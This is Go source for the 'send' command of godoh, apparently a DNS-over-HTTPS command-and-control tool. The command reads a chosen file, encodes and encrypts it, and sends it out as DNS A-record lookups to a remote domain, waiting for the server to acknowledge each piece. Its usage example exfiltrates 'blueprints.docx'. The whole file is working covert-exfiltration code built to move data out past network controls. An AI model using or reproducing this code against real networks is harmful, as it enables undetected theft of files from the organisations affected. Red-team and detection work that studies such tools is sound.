package cmd

import (
	"fmt"
	"io/ioutil"
	"os"

	"github.com/sensepost/godoh/dnsclient"
	"github.com/sensepost/godoh/protocol"

	"github.com/miekg/dns"
	"github.com/spf13/cobra"

	log "github.com/sirupsen/logrus"
)

var sendCmdFileName string

// sendCmd represents the send command
var sendCmd = &cobra.Command{
	Use:   "send",
	Short: "Send a file via DoH",
	Long: `Send a file via DoH.

The source file will be encoded, encrypted and sent
via DNS A record lookups to the target domain.

Example:
	godoh --domain example.com send --file blueprints.docx`,
	Run: func(cmd *cobra.Command, args []string) {

		sendLogger := log.WithFields(log.Fields{"module": "send"})

		if sendCmdFileName == "" {
			sendLogger.Fatal("Please provide a file name to send!")
		}

		file, err := os.Open(sendCmdFileName)
		if err != nil {
			sendLogger.Fatal(err)
		}
		defer file.Close()

		fileInfo, err := file.Stat()
		if err != nil {
			sendLogger.Fatal(err)
		}

		fileSize := fileInfo.Size()
		log.WithFields(log.Fields{"file": sendCmdFileName, "size": fileSize}).
			Info("File name and size")

		fileBuffer, err := ioutil.ReadAll(file)
		if err != nil {
			sendLogger.Fatal(err)
		}

		message := protocol.File{}
		message.Prepare(&fileBuffer, fileInfo)
		requests, successFlag := message.GetRequests()

		log.WithFields(log.Fields{"file": sendCmdFileName, "size": fileSize, "requests": len(requests)}).
			Info("Making DNS requests to transfer file")

		for _, r := range requests {
			response := dnsclient.Lookup(dnsProvider, fmt.Sprintf(dnsDomain, r), dns.TypeA)

			if response.Data == successFlag {
				log.WithFields(log.Fields{
					"file":     sendCmdFileName,
					"size":     fileSize,
					"requests": len(requests),
					"response": response.Data,
				}).Info("Server successfully acked")

			} else {
				fmt.Println("Server did not respond with a successful ack. Exiting.")
				return
			}
		}

		fmt.Println("Done! The file should be on the other side! :D")
	},
}

func init() {
	rootCmd.AddCommand(sendCmd)

	sendCmd.Flags().StringVarP(&sendCmdFileName, "file", "f", "", "The file to send.")
}
